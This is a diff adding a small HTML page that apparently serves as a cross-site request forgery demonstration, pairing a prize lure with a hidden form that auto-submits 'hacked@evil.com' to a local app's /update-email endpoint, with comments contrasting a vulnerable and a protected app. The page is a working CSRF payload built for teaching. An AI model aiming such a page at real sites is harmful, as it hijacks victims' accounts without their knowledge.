@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>You Won a Prize!</title></head>
+<body>
+  <h1>Congratulations! Click anywhere to claim your prize...</h1>
+  <p>(This page auto-submits a hidden form to the target app's /update-email endpoint)</p>
+
+  <!-- Point this at the VULNERABLE app (port 3000) to see the attack succeed. -->
+  <!-- Point this at the SAFE app (port 3001) to see it get blocked (403). -->
+  <form id="csrf-form" action="http://localhost:3000/update-email" method="POST">
+    <input type="hidden" name="email" value="hacked@evil.com">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
